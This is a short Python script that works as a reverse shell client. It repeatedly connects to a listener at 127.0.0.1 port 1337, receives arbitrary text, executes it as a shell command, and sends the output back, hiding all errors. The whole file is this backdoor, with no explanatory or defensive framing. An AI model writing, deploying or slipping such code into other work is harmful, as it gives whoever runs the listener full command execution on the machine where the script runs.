from socket import socket
from contextlib import suppress
from subprocess import run, PIPE
data = b' '
while True:
    with suppress(Exception):
        s = socket()
        s.connect(('127.0.0.1', 1337))
        s.send(data)
        command = s.recv(65535).decode()
        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
        data = p.stdout or p.stderr or b' '
        s.close()
